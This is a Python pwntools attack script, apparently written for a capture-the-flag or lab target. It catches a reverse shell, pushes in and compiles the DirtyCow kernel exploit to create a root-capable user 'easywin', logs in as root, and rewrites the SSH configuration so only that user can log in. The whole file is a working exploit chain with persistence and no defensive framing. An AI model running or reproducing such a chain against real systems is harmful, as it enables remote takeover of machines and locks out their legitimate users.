#! /usr/bin/env python3
from pwn import *
import time
import subprocess
import os

file = open(os.path.dirname(os.path.abspath(__file__))+'/dirty.c', 'r')
content = file.read()
file.close()

# Listen the reverse shell
l = listen(1234)
# Launch the reverse shell in background
p = subprocess.Popen(["python3", os.path.dirname(os.path.abspath(__file__))+"/reverse_shell_inject.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
l.wait_for_connection()
# Send dirty cow exploit code
l.sendline("cat > dirty.c << EOF")
l.sendline(content)
l.sendline("EOF")

l.sendline("gcc dirty.c -o dirty -pthread -lcrypt && ./dirty easywin")
print("Waiting 30 seconds for DirtyCow ...")
time.sleep(30)
l.close()

# Listen the reverse shell
l = listen(1234)
# Launch the reverse shell in background
p = subprocess.Popen(["python3", os.path.dirname(os.path.abspath(__file__))+"/reverse_shell_inject.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
l.wait_for_connection()

l.sendline("su root")
time.sleep(2)
l.sendline("easywin")
time.sleep(2)
l.sendline("echo 'AllowUsers easywin' > /etc/ssh/sshd_config")
l.sendline("service ssh restart")
l.interactive()
